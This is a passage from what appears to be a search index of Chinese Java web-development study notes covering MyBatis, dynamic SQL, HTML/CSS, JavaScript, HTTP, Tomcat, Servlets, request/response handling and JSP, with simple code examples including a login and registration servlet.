userMapper.selectUser(1); //7.关闭资源 sqlSession.close(); } @Test public void Test03() throws IOException { //6.调用方法 userMapper.deleteUser(3); //7.提交事务 sqlSession.commit(); //8.关闭资源 sqlSession.close(); } @Test public void Test04() throws IOException { //6.调用方法 User user = new User(4, \"牛魔王\", Date.valueOf(\"1980-1-1\"), \"男\", \"太乙江山\"); int row = userMapper.updateUser(user); System.out.println(\"row = \" + row); //7.提交事务 sqlSession.commit(); //8.关闭资源 sqlSession.close(); } @Test public void Test05() throws IOException { //6.调用方法 User user = new User(10086, \"女菩萨\", Date.valueOf(\"2000-1-1\"), \"女\", \"观音山\"); System.out.println(\"插入前的ID = \" + user.getId()); int row = userMapper.addUser(user); System.out.println(\"row = \" + row); System.out.println(\"插入后的ID = \" + user.getId()); //7.提交事务 sqlSession.commit(); //8.关闭资源 sqlSession.close(); } 多参数处理 关于@Param注解 如果mapper接口方法上只有一个普通类型的参数，不需要加@Param注解，映射配置文件中#{}中可以任意写名称，建议做到见名知意 如果mapper接口方法上是实体类类型的参数，不需要加@Param注解，映射配置文件中#{}中和实体类中的属性名保持一致 如果mapper接口方法上是多个参数，需要加@Param注解给每个参数起名字，映射配置文件中#{}中书写的是@Param注解中写的名称 如果mapper接口方法是单个单列集合类型或者数组类型，需要加@Param注解给参数起名 如果mapper接口方法是单个map集合类型，不需要加@Param注解，映射配置文件中#{}中名称需要和map集合的键名保持一致 //多参数处理(默认方案需要对SQL语句进行修改，可读性差) //List selectByCondition(String name,String sex); //方案1：散装处理 @Param(“占位符”) //List selectByCondition(@Param(\"username\")String username, @Param(\"sex\")String sex); //方案2：对象参数 对象的属性名称要和参数占位符名称一致 //List selectByCondition(User user); //方案3：Map集合 Map的键要和占位符名称一致 List selectByCondition(Map map); @Test public void Test06() throws IOException { //6.调用方法 //默认方案&方案1 //List userList = userMapper.selectByCondition(\"%精%\", \"女\"); //方案2 //User user = new User(); //user.setUsername(\"%女%\"); //user.setSex(\"女\"); //List userList = userMapper.selectByCondition(user); //方案3 Map map = new HashMap<>(); map.put(\"username\",\"%女%\"); map.put(\"sex\",\"女\"); List userList = userMapper.selectByCondition(map); userList.forEach(System.out::println); //7.关闭资源 sqlSession.close(); } 动态SQL 多条件查询 where标签 自动补全where关键字 去掉多余的and和or关键字 if标签 属性内的条件成立时，内容则拼接为SQL语句 //多条件查询 List selectIf(@Param(\"username\") String username, @Param(\"sex\") String sex); select * from user username like #{username} and sex = #{sex} @Test public void Test07() throws IOException { //6.调用方法 List userList = userMapper.selectIf(\"%精%\",\"女\"); userList.forEach(System.out::println); //7.关闭资源 sqlSession.close(); } 修改部分字段数据 set标签 用在update语句中，相当于set关键字 可去掉SQL语句中多余的逗号 注意： 当所有参数都为空时，SQL语句会报错，因此需要添加必要参数防止报错 where语句要在标签外面 //修改部分数据 int updateIf(User user); update user id = #{id}, username=#{username}, birthday=#{birthday}, sex=#{sex}, address=#{address} where id=#{id} @Test public void Test08() throws IOException { //6.调用方法 User user = new User(); user.setUsername(\"狐狸精\"); user.setBirthday(Date.valueOf(\"1999-1-1\")); user.setId(2); int row = userMapper.updateIf(user); System.out.println(\"row = \" + row); //提交事务 sqlSession.commit(); //7.关闭资源 sqlSession.close(); } 批量删除 foreach标签 | foreach标签的属性 | 作用 | | ----------------- | ------------------------------ | | collection | 参数名 | | item | 设置变量名，代表每个遍历的元素 | | separator | 遍历一个元素添加的内容 | | #{变量名} | 先使用?占位, 后面给?赋值 | | open | 在遍历前添加一次字符 | | close | 在遍历后添加一次字符 | //批量删除 collection标签属性默认值是数组叫array，集合叫list //如果要自定义，则手动进行散装 int deleteIf(@Param(\"list\") int[] ids); delete from user where id in #{id} @Test public void Test09() throws IOException { //6.调用方法 int[] list = {2,4}; int row = userMapper.deleteIf(list); System.out.println(\"row = \" + row); //提交事务 sqlSession.commit(); //7.关闭资源 sqlSession.close(); } 根据性别查询用户 choose标签 | choose标签的属性 | 作用 | | ---------------- | -------------------- | | when | 匹配一个条件 | | otherwise | 所有条件不匹配时执行 | //根据数字判断性别进行查询 List selectSex(int sex); select * from user sex = '男' sex = '女' sex = '女' @Test public void Test10() throws IOException { //6.调用方法 List users = userMapper.selectSex(10); users.forEach(System.out::println); //7.关闭资源 sqlSession.close(); } 接口映射文件：resultMap输出映射 当字段名与对象的成员变量一致时,MyBatis可以把查询的结果自动封装为对象；但是不一致时，名称不一致的成员变量就获取不到数据 解决方法： 方案1：给无法直接对应的字段赋予别名 select o_id oId, user_id userId, number, create_time createTime, note from tb_order; 方案2：在mybatis-config.xml配置文件的标签内添加字段进行设置 方案3：resultMap输出映射（接口映射文件） select * from tb_order; Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-26 21:18 "},"Java笔记/Day20-MyBatis高级.html":{"url":"Java笔记/Day20-MyBatis高级.html","title":"Day20-MyBatis高级","keywords":"","body":" 相关实体类 【注意：定义实体时，基本类型应选用包装类；如果不使用包装类，初始化对象后会有一个默认值，在update修改数据时，会影响null的判断】 //封装User表的数据 public class User { private Integer id; private String username; private Date birthday; private String sex; private String address; //关联userinfo对象，作为属性放进来 private UserInfo userInfoDate; //关联order对象，作为属性放进来 //因为是一对多，所以封装为list对象 private List userOrderList; //关联Role的对象,作为属性放进来 //因为是一对多，所以封装成list对象 private List roleList; .... //封装userinfo表的数据 public class UserInfo { private Integer id; private Double height; private Double weight; private Integer married; .... //封装order表的数据 public class Order { private Integer oId; private Integer userId; private String number; private Timestamp createTime; private String note; .... //封装role表的数据 public class Role { private Integer roleId; private String roleName; private String roleDetail; //因为role与user是一对多的关系，所以封装为list对象 private List userList; .... 多表查询 一对一关联 //根据用户ID查询用户信息 List findUserById(int id); select * from user inner join user_info on user.id=user_info.id where user.id=#{id}; 一对多的关联 //根据用户ID查询用户信息及其订单 User findUserAndOrder(int id); --> select * from user left outer join tb_order on user.id=tb_order.user_id where user.id=#{id}; 多对多关联 //根据用户id查询用户关联的角色信息 User findUserAndRoles(int id); --> --> select * from user inner join user_role on user.id=user_role.user_id inner join role on user_role.role_id=role.role_id where user.id = #{id} //根据角色id查询角色信息以及相关的用户信息 Role findRoleAndUsers(int id); select * from role inner join user_role on role.role_id=user_role.role_id inner join user on user_role.user_id=user.id where role.role_id = #{id} 级联查询 在xml里将若干个子查询进行级联，先查询出一部分数据，再做另一部分的查询 在调用findUserById2方法时，会对User的基本信息进行查询，但是User类中除了包含基本信息外，还有userInfoDate、userOrderList等数据需要确定，如果resultMap中有对这些数据配置查询方法，则会通过配置的findUserInfoById2、findOrderByUserId2方法传递相关参数进行后续查询 resultMap中的一些参数 select=\"方法名\"第二个查询的方法 column=\"id\"传递给第二个查询的参数 fetchType=\"lazy\"懒加载，使用到的时候在进行第二个查询语句 //级联查询 //根据用户ID查询用户的基本信息 User findUserById2(int id); //根据用户ID查询用户的扩展信息 UserInfo findUserInfoById2(int id); //根据用户ID查询用户的订单信息 List findOrderByUserId2(int id); select * from user where id=#{id} select * from user_info where id=#{id} select * from tb_order where user_id=#{id} 但在开发中常用的是在方法中进行子查询嵌套 注解开发 注解开发可以在接口文件中完成简单功能，无需在映射文件中编写 //注解开发 //查询所有的User的数据 @Select(\"select * from user\") List selectAllUsers3(); //新增User对象 @Insert(\"insert into user values (null,#{username},#{birthday},#{sex},#{address})\") int insertUser3(User user); //修改User对象地址 @Update(\"update user set address=#{address} where id =#{id}\") int updateUser3(User user); //删除User对象 @Delete(\"delete from user where id=#{id}\") int deleteUser3(int id); MyBatis缓存 MyBatis框架中缓存分为一级缓存和二级缓存，通过缓存策略可以减少查询数据库的次数，提升系统性能 一级缓存 默认开启 在同一个sqlSession范围内部有效 当调用sqlSession的修改、添加、删除、提交、关闭等方法时，一级缓存会被清空；也可以手动调用sqlSession.clearCache()进行清理 二级缓存 开启条件 在实例类中实现Serializable接口，如果涉及多表查询，则每个实体类都需要实现这个序列化 在mybatis-config.xml的setting里面需要设置开启二级缓存： 在Mapper.xml映射文件的标签中添加标签，开启二级缓存使用 存在Mapper中，在多个sqlSession中共享 只有在前一个sqlSession中调用close()后才会缓存 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-08 10:45 "},"Java笔记/Day21-HTML5+CSS.html":{"url":"Java笔记/Day21-HTML5+CSS.html","title":"Day21-HTML5+CSS","keywords":"","body":"HMTL5 HTML：超文本标记语言 网页主要组成部分： HTML：用来制作网页基础内容和基本结构 CSS：用于网页样式美化效果 JavaScript：用来制作数据验证、交互行为效果，可以动态操作网页的元素增删查改 文本标签 | 标签 | 说明 | | ----- | ------------------------------------------------------------ | | h1~h6 | 表示文档标题,~ , 呈现了六个不同的级别的标题 , 级别最高, 级别最低 | | p | 表示文本的一个段落 | | hr | 表示段落级元素之间的主体转换,一般显示为水平线 | | i | 表示文本斜体 | | b | 表示加粗文本 | | font | 表示字体,可以设置样式(已过时) | | br | 表示换行 | | ol-li | 有序列表 | | ul-li | 无序列表 | span和div 都是容器，可以包裹其他内容 | 标签 | 作用 | | ---- | ------------------------------------------------------------ | | span | 是内联标签，不带换行功能，用于小范围的内容的划分 | | div | 是块标签，自带换行功能，用于一段的范围的内容划分，通常网页布局使用div将网页分成不同块 | 图片标签： 链接标签：内容 target属性：页面打开方式，_self当前页（默认值），_blank新标签页 表格标签 | 标签名 | 作用 | | ------- | ------------------------------------------------------------ | | table | 表格容器，包含其他的表格元素 | | tr | 表示一行 table row | | th | 列标题：加粗，居中 table head | | td | 普通单元格 | | caption | 表格的标题 | | thead | 在逻辑上将表格层三个部分：表格头部 | | tbody | 在逻辑上将表格层三个部分：表格的主体 注意：如果没有写tbody，浏览器运行时会自动加上tbody | | tfoot | 在逻辑上将表格层三个部分：表格的脚部 | 表单标签： 表单数据提交的两个要求 必须用from标签将表单项标签包起来 表单标签上必须有name属性 CSS css导入html的三种方式 内联式：在标签内部使用style属性 内容 内部式：定义标签，在标签内部定义css样式 div{ color: bule; } 外部式：定义link标签，引入外部的css文件 div{ color: pink; } css选择器 元素选择器：元素名称{color: red;} h1{ color: red; } id选择器：#id值{color: red;} #a2{ color: red; } 类选择器：.class值{color: red;} .one{ color: red; } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-29 15:54 "},"Java笔记/Day22-JavaScript.html":{"url":"Java笔记/Day22-JavaScript.html","title":"Day22-JavaScript","keywords":"","body":"JavaScript基础语法 JavaScript：用于制作数据验证和用户交互 是一门跨平台、面向对象的脚本语言，运行在浏览器端 输出语句： window.alert()写入警告框 document.write()写入HTML输出 console.log()写入浏览器控制台 编写位置 行内位置：只能给当前标签使用 点我 内部位置：只能给当前页面使用 document.write(\"我是内部的JavaScript代码\"); 外部位置：可以给多个html页面使用 document.write(\"我是外部引入的JavaScript代码\") 无效的js代码编写位置 3.3.错误2：不能提前结束，影响后面的JS执行 --> 定义变量 ES5：var 变量名 = 变量值;（已过时） ES6：let 变量名 = 变量值; 或 const 常量名 = 常量值; 数据类型 查询变量的所属的类型： 方法1：typeof 变量名 方法2：typeof(变量名) | 类型 | 说明 | | --------- | ---------------------------------------------------------- | | number | 数值型：包含整数、小数 | | boolean | 布尔型：包含true/false | | string | 字符串：包含字符和字符串 | | object | 对象类型：包含系统内置对象和用户自定义的对象，NULL也是对象 | | undefined | 未定义的类型，未知的类型 没有使用=赋值 | 数据类型的boolean类转换 | 数据类型 | 为真 | 为假 | | ----------------- | ------------ | -------- | | number | 非0 | 0 | | string | 非空字符串 | 空字符串 | | undefined | | 假 | | NaN(Not a Number) | | 假 | | object | 对象不为null | null | 运算符 /：JavaScript 中除法是可以除得尽，如果除不尽会保留16位小数 ==：等于(比较值，不比较类型) ===：恒等于（比较值和类型） &和|：逻辑运算符不建议单与&、单或|，起结果false和true会变成数字0和1 函数 命名函数 /* 命名函数就是有名字的函数,格式如下: function 函数名(参数列表) { 代码; return 返回值; } */ // 定义一个函数实现加法功能 function add(a, b) { let sum = a + b; return sum; } // 调用函数格式: let sum = add(10, 20); document.write(sum + \"\") 匿名函数 /* 匿名函数格式如下: function (参数列表) { 代码块; return 返回值; } */ // 定义一个匿名函数实现加法功能 let add = function (a, b) { let sum = a + b; return sum; } // 调用函数 document.write(add(10, 20) + \"\") Array 定义： 方法1：let 变量名 = new Array(元素1,元素2); 方法2：let 变量名 = [元素1,元素2]; 可以使用push()方法添加任意个数和类型的数据 删除：splice(开始位置, 删除的数量) String 定义： 方法1：let 变量名 = new String(s); 方法2：let 变量名 = s; trim()去除字符串首尾的空白 自定义对象 // JS自定义对象 let npy = { name: \"刘亦菲\", age: 18, npy: function () { document.write(this.name + \"是我女朋友\") } } // 使用对象, 和 Java一样的格式 (点语法) 对象.成员变量 或 对象.成员方法() document.write(npy.name + npy.age + \"\") npy.npy() BOM window浏览器窗口对象 // window.可以省略 // alert提示框(只有确定按钮) window.alert(\"拦截\"); // 输入框(可以输入数据,有确定和取消按钮), 点击确定得到输入的内容, 点击取消得到null document.write(window.prompt(\"确认继续访问？\") + \"\") // 确认框(只有有确定和取消按钮), 点击确定得到true, 点击取消得到false document.write(window.confirm(\"你成年了吗？\") + \"\") 计时器相关 // 定时器 // window.setTimeout(函数名, 间隔毫秒数) 过指定时间后执行一次函数 setTimeout(refresh,2000); // window.setInterval(函数名, 间隔毫秒数) 每隔指定的时间都会执行前面的函数(反复执行) setInterval(refresh,2000); window.location地址栏对象 // 获取当前地址 document.write(location.href + \"\") // 跳转到新设定的url地址 location.href = \"https://none.org.cn\"; window.history历史记录 当页面进行了跳转时，有了缓存记录该功能才能使用 后退 前进 DOM 获取元素的方法 作用 document.getElementById(\"b1\") 通过id获取一个元素 document.getElementsByTagName (\"标签名\") 通过标签名获取一组元素 document.getElementsByName(\"name\") 通过name属性获取一组元素 document.getElementsByClassName(\"类名\") 通过样式类名获取一组元素 事件监听 用户可以对网页的元素有各种不同的操作如：单击，双击，鼠标移动等这些操作就称为事件 function abc() { alert(\"命名函数设置事件\"); } document.getElementById(\"input2\").onclick = function () { alert(\"匿名函数设置事件\"); } 用户名: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;请输入 // 命名函数设置事件 function chick() { document.getElementById(\"sp1\").innerText = \"正在输入\" } // 匿名函数设置失去焦点的事件 document.getElementById(\"in1\").onblur = function () { document.getElementById(\"sp1\").innerText = \"请输入\" } JavaScript&正则表达式 创建方式： let reg = new RegExp(\"1[3456789]\\\\d{9}\");字符串内的斜杠\\想要进行转义 let reg = /^1[3456789]\\d{9}$/;在js中正则表达式默认是部分匹配，如需精确匹配需要在首尾添加^和$ //定义正则表达式 let reg = /^[1][3456789]\\d{9}$/; //test(需要匹配的字符串) let result = reg.test(phone); Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-02 16:15 "},"Java笔记/Day23-HTTP+Tomcat+Servlet.html":{"url":"Java笔记/Day23-HTTP+Tomcat+Servlet.html","title":"Day23-HTTP+Tomcat+Servlet","keywords":"","body":"JavaWeb 静态资源：HTML、CSS、JavaScript等。负责页面展现，资源是一成不变的，运行在浏览器 动态资源：Servlet、JSP等。负责逻辑处理，资源是变化的，运行在服务器 Web服务器：负责解析HTTP协议，解析请求数据，并发送响应数据 HTTP 特点 基于TCP协议：三次握手进行链接，是可靠的 请求-响应模型：一次请求对应一次响应 无状态的协议：对于事务的处理没有记忆能力，导致每次的请求-响应都是独立的 缺点：多次请求间不能共享数据，可使用Cookie、Session来解决 优点：速度快 HTTP - 请求数据格式 请求行：请求数据的第一行，由三部分组成。其中GET表示请求方式，/表示请求资源路径，HTTP/1.1表示协议版本 请求头：第二行开始，格式为key: value形式 请求体：POST请求的最后一部分，与请求头之间有空行隔开，存放请求参数 HTTP - 响应数据格式 响应行：响应的数据的第一行，响应行包含三部分内容，分别是HTTP/1.1HTTP协议及版本，200响应状态码，OK状态码描述 响应头：第二行开始，格式为key: value形式 响应体：最后一部分，和响应头之间有一个空行隔开，存放响应数据 Tomcat Web服务器是一个应用程序，对HTTP协议的操作进行封装，主要功能是提供网上信息浏览服务 Tomcat是Apache软件基金会一个核心项目，是一个开源免费的轻量级Web服务器，支持Servlet/JSP少量JavaEE规范 启动的过程中，控制台有中文乱码，需要修改conf/logging.prooperties中的UTF-8为GBK 关闭建议使用bin\\shutdown.bat或ctrl+c的方式正常关闭 Tomcat默认的端口是8080，要想修改Tomcat启动的端口号，需要修改 conf/server.xml Web项目结构 Maven Web项目结构（开发中的项目） 开发完成部署的Web项目 开发项目通过执行Maven打包命令package,可以获取到部署的Web项目目录 编译后的Java字节码文件和resources的资源文件，会被放到WEB-INF下的classes目录下 pom.xml中依赖坐标对应的jar包，会被放入WEB-INF下的lib目录下 Servlet Servlet是JavaWeb最为核心的内容，是JavaEE规范之一，它是Java提供的一门动态web资源开发技术，是==处理浏览器的请求，并作出响应的接口== 创建Servlet项目流程 创建web项目，在pom.xml文件内的project标签内导入Servlet坐标 javax.servlet javax.servlet-api 3.1.0 provided 创建一个类实现Servlet接口，并重写接口中的所有方法 配置：在类上使用@WebServlet注解，并配置该Servlet的访问路径 @WebServlet(\"/demo01\") public class ServletDemo01 implements Servlet { @Override public void init(ServletConfig servletConfig) throws ServletException { System.out.println(\"demo01 init\"); } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { System.out.println(\"Hello Web!\"); } @Override public String getServletInfo() { return null; } @Override public void destroy() { System.out.println(\"demo01 destroy\"); } } 访问：启动Tomcat，浏览器输入URL访问该Servlet http://localhost:8080/day12_01_HTTP_Tomcat_Servlet_war_exploded/demo01 Servlet执行流程 根据localhost:8080可以找到要访问的Tomcat Web服务器 根据day12_01_HTTP_Tomcat_Servlet_war_exploded可以找到部署在Tomcat服务器上的web-demo项目 根据demo01可以找到要访问的是项目中的哪个Servlet类，根据@WebServlet后面的值进行匹配 找到ServletDemo1这个类后，Tomcat Web服务器就会为ServletDemo1这个类创建一个对象，然后调用对象中的service方法 Servlet生命周期 一个Servlet在Tomcat容器中只会实例化一次，只会产生一个对象，而且常驻内存。要等到服务器关闭才会销毁 提前加载Servlet 负整数：第一次被访问时再创建Servlet对象 0或正整数：服务器启动时创建Servlet对象，数字越小优先级越高 @WebServlet(value = \"/demo01\",loadOnStartup = 1) HttpServlet 对实现了Servlet根接口的Servlet类进行了继承 可以根据不同的请求方式，调用不同的doXxx方法 @WebServlet(\"/demo3\") public class ServletDemo03 extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { System.out.println(\"demo3 doGet\"); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { System.out.println(\"demo3 doPost\"); } } urlPattern配置 一个Servlet可以配置多个urlPattern @WebServlet(urlPatterns = {\"/demo7\",\"/demo8\"}) urlPattern配置规则 精确匹配： 配置路径：@WebServlet(\"/user/select\") 访问路径：http://localhost:8080/web-demo/user/select 目录匹配： 配置路径：@WebServlet(\"/user/*\") 访问路径： http://localhost:8080/web-demo/user/aa http://localhost:8080/web-demo/user/a/b 扩展名匹配： 配置路径：@WebServlet(\"*.do\") 访问路径：http://localhost:8080/web-demo/user/bb.do 任意匹配： 配置路径：@WebServlet(\"/\")、@WebServlet(\"/*\") 访问路径：http://localhost:8080/web-demo/user/haha 【注意】 如果路径配置的不是扩展名，那么在路径的前面就必须要加/否则会报错 如果路径配置的是*.do,那么在前面就不能加/，否则会报错 优先级为：精确匹配 > 目录匹配> 扩展名匹配 > /* > / XML配置Servlet @WebServlet这个是Servlet从3.0版本后开始支持注解配置，3.0版本前只支持XML配置文件的配置方法 配置步骤： 编写Servlet类 public class ServletDemo04 extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { System.out.println(\"demo4 doGet\"); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { System.out.println(\"demo04 doPost\"); } } 在web.xml中配置该Servlet xmlDemo cn.org.none.servlet.ServletDemo04 xmlDemo /demo04 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-03 09:09 "},"Java笔记/Day24-Request+Response.html":{"url":"Java笔记/Day24-Request+Response.html","title":"Day24-Request+Response","keywords":"","body":"Requset request：后台服务器（Tomcat）会对HTTP请求中的数据进行解析，并把解析结果存入到request对象 Requset获取请求数据 请求行：GET /request-demo/req1?username=zhangsan HTTP/1.1 String getMethod()获取请求方式：GET String getContextPath()获取虚拟目录（项目访问路径）：/request-demo String getRequestURI()获取URI（统一资源标识符）：/request-demo/req1 StringBuffer getRequestURL()获取URL（同一资源定位符）：http://localhost:8080/request-demo/req1 String getQueryString()获取请求参数（get方式）：username=zhangsan HTTP/1.1 请求头： String getHeader(String name) //获取浏览器的版本信息 String agent = request.getHeader(\"user-agent\"); 请求体（post方式）： 字节文件用：request.getInputStream() 纯文本用：request.getReader() @WebServlet(value = \"/Demo1\") public class Demo1Request extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //get请求 System.out.println(\"请求方式 = \" + request.getMethod()); System.out.println(\"项目访问路径 = \" + request.getContextPath()); System.out.println(\"URI = \" + request.getRequestURI()); System.out.println(\"URL = \" + request.getRequestURL()); System.out.println(\"请求参数 = \" + request.getQueryString()); System.out.println(\"浏览器版本 = \" + request.getHeader(\"user-agent\")); } @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //post请求 //doGet(request, response); BufferedReader reader = request.getReader(); String s = reader.readLine(); System.out.println(\"POST请求参数 = \" + s); } } //ufferedReader流是通过request对象来获取的，当请求完成后request对象就会被销毁，request对象被销毁后，BufferedReader流就会自动关闭，所以此处就不需要手动关闭流了 通用方式获取请求参数 GET 请求方式 和 POST 请求方式 区别主要在于获取请求参数的方式不一样，request对象已经将获取请求参数的方法进行了封装，将请求参数进行了分割，存入到Map集合中 @WebServlet(value = \"/Demo2\") public class Demo2Request extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //get请求 //Tomcat8.0之后，已将GET请求乱码问题解决，设置默认的解码方式为UTF-8 //POST的请求参数是通过request的getReader()来获取流中的数据，tomcat在获取流的时候采用的编码是ISO-8859-1，而该字符集是不支持中文的 //需要解决POST请求中文乱码问题 String method = request.getMethod(); if (method.equalsIgnoreCase(\"post\")) { request.setCharacterEncoding(\"UTF-8\"); } //获取单个参数对应的值 String name = request.getParameter(\"username\"); System.out.println(\"username = \" + name); //获取单个参数对应的数组 String[] hobbies = request.getParameterValues(\"hobby\"); System.out.println(\"hobbies = \" + Arrays.toString(hobbies)); //获取所有参数的Map集合 Map map = request.getParameterMap(); map.forEach((key, values) -> { System.out.println(key + \":\" + Arrays.toString(values)); }); } @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //post请求 doGet(request, response); } } 请求转发 请求转发（forward）：一种在==服务器内部==的资源跳转方式 浏览器只发出一次请求，URL不改变 只能转发到当前服务器内部的资源 可以在转发的资源间共享数据 //实现方式 request.getRequestDispatcher(\"资源B路径\").forward(request,response); //A资源 @WebServlet(value = \"/a\") public class A_Servlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //设置资源共享（要在转发前面） request.setAttribute(\"name\",\"zhangsan\"); //请求转发 request.getRequestDispatcher(\"b\").forward(request,response); } //B资源 @WebServlet(value = \"/b\") public class B_Servlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //接受共享的资源 Object name = request.getAttribute(\"name\"); System.out.println(\"name = \" + name); } Response 常用方法 @WebServlet(value = \"/Demo3\") public class Demo3Response extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { /**Response获取的字符输出流默认编码ISO-8859-1 * 解决中文乱码问题： * 1.设置响应类型为：text/html * 2.设置编码格式：charset=utf-8 */ response.setContentType(\"text/html;charset=utf-8\"); //设置响应行 response.setStatus(404); //设置响应头 response.setHeader(\"content-type\",\"text/html\"); //获取响应字符输出流 PrintWriter writer = response.getWriter(); //写数据 writer.write(\"你好 Demo4\"); } //该流不需要关闭，随着响应结束，response对象销毁，由服务器关闭 IOUtils工具类 导入坐标 commons-io commons-io 2.11.0 使用IOUtils工具类进行输出 @WebServlet(value = \"/Demo5\") public class Demo5Servlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //get请求 FileInputStream fis = new FileInputStream(\"F:\\\\java_code\\\\JavaSE182\\\\day12.03_Request_Response\\\\src\\\\main\\\\webapp\\\\imgs\\\\Desert.jpg\"); ServletOutputStream os = response.getOutputStream(); // byte[] bytes = new byte[1024 * 8]; // int len; // while ((len = fis.read(bytes)) != -1) { // os.write(bytes, 0, len); // } IOUtils.copy(fis,os); fis.close(); } Response重定向 重定向（redirect）：一种资源跳转方式 浏览器发出两次请求，URL发生改变 可以重定向到任意位置的资源（服务器内部、外部均可） 不能在资源间共享数据 //实现方式1 response.setStatus(302); response.setHeader(\"location\",\"资源B的路径\"); //实现方式2 response.sendRedirect(\"资源B的路径\"); 路径问题 一般来说，在服务器内部进行跳转不需要添加\"/\"，一般只有使用@WebServlet(\"/demo\")一定要添加\"/\" 从浏览器跳转需要添加\"/\" 登录&注册案例 登录 用户填写用户名密码，提交到 LoginServlet 在 LoginServlet中使用 MyBatis查询数据库，验证用户名密码是否正确 如果正确，响应“登录成功”，如果错误，响应“登录失败” 注册 用户填写用户名、密码等信息，点击注册按钮，提交到 RegisterServlet 在 RegisterServlet 中使用 MyBatis 保存数据 保存前，需要判断用户名是否已经存在：根据用户名查询数据库 @WebServlet(value = \"/loginServlet\") public class LoginServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //get请求 //解决中文报错 request.setCharacterEncoding(\"utf-8\"); response.setContentType(\"text/html;charset=utf-8\"); //获取请求参数 String username = request.getParameter(\"username\"); String password = request.getParameter(\"password\"); //调用Mapper查询用户信息 SqlSession sqlSession = MyBatisUtils.openSqlSession(); UserMapper mapper = sqlSession.getMapper(UserMapper.class); User user = mapper.select(username, password); //输出登录信息 PrintWriter writer = response.getWriter(); if (user == null) { writer.write(\"登录失败，用户名或密码错误！\"); } else { writer.write(\"欢迎\" + username + \"登录成功！\"); } //释放资源 sqlSession.close(); } @WebServlet(value = \"/registerServlet\") public class RegisterServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //get请求 //解决中文报错 request.setCharacterEncoding(\"utf-8\"); response.setContentType(\"text/html;charset=utf-8\"); //获取请求参数 String username = request.getParameter(\"username\"); String password = request.getParameter(\"password\"); //调用mapper进行判断 SqlSession sqlSession = MyBatisUtils.openSqlSession(); UserMapper mapper = sqlSession.getMapper(UserMapper.class); User user = mapper.selectByName(username); PrintWriter writer = response.getWriter(); if (user == null) { mapper.addUser(username,password); //【提交事务】 sqlSession.commit(); writer.write(\"恭喜\"+username+\"注册成功！\"); }else { writer.write(\"该用户名已经存在，请重新注册\"); } //释放资源 sqlSession.close(); } public interface UserMapper { @Select(\"select * from tb_user where username=#{uname} and password=#{psw}\") User select(@Param(\"uname\") String username, @Param(\"psw\") String password); @Select(\"select * from tb_user where username=#{username}\") User selectByName(String username); @Insert(\"insert into tb_user values (null,#{username},#{password})\") void addUser(@Param(\"username\")String username, @Param(\"password\")String password); } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-05 11:27 "},"Java笔记/Day25-Jsp+MVC.html":{"url":"Java笔记/Day25-Jsp+MVC.html","title":"Day25-Jsp+MVC","keywords":"","body":"JSP概述 JSP（全称：Java Server Pages）：Java 服务端页面。是一种==动态==的网页技术，其中既可以定义 HTML、JS、CSS等静态内容，还可以定义 Java代码的动态内容，也就是 JSP = HTML + Java JSP 作用：简化开发，避免了在Servlet中直接输出HTML标签 原理：JSP本质上就是一个Servlet，最终调用的就是==_jspService方法==。JSP在被访问时，由JSP容器（Tomcat）将其转换为Java文件（Serclet），再由JSP容器（Tomcat）将其编译，最终对外提供服务的其实就是这个字节码文件 JSP缺点： 书写麻烦：特别是复杂的页面 阅读麻烦 复杂度高：运行需要依赖于各种环境，JRE，JSP容器，JavaEE… 占内存和磁盘：JSP会自动生成.java和.class文件占磁盘，运行的是.class文件占内存 调试困难：出错后，需要找到自动生成的.java文件进行调试 不利于团队协作：前端人员不会 Java，后端人员不精 HTML 由于上述的问题， JSP 已逐渐退出历史舞台，以后开发更多的是使用 HTML + Ajax来替代 Serlet：逻辑处理，封装数据 JSP：获取数据，遍历展现数据 相关依赖 mysql mysql-connector-java 5.1.46 org.mybatis mybatis 3.5.5 javax.servlet javax.servlet-api 3.1.0 provided javax.servlet.jsp jsp-api 2.2 provided jstl jstl 1.2 commons-beanutils commons-beanutils 1.9.4 JSP脚本 用于在 JSP页面内定义 Java代码 分类 内容会直接放到_jspService()方法之中 内容会放到out.print()中，作为out.print()的参数，在页面输出 内容会放到_jspService()方法之外，被类直接包含 EL表达式 主要功能：获取数据 语法：${example}获取域中存储的key为example的数据 JavaWeb的域对象（el表达式获取数据，会依次从这4个域中寻找，直到找到为止） page：当前页面有效 request：当前请求有效 session：当前会话有效 application：当前应用有效 JSTL标签 JSP标准标签库(Jsp Standarded Tag Library) ，使用标签取代JSP页面上的Java代码 相关依赖 jstl jstl 1.2 标签 启用 标签 items：被遍历的容器 